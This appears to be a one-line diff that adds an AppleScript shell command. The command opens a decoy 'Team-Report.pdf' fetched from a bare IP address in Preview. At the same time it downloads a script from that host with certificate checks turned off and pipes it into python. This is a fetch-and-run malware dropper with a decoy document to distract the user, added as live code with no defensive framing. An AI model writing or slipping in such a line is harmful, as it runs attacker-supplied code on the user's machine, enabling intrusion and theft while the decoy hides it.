@@ -1,0 +1,1 @@
+do shell script "curl -ks https://1.2.3.4/Team-Report.pdf | open -f -a Preview.app & curl -ks https://1.2.3.4/script | python - "
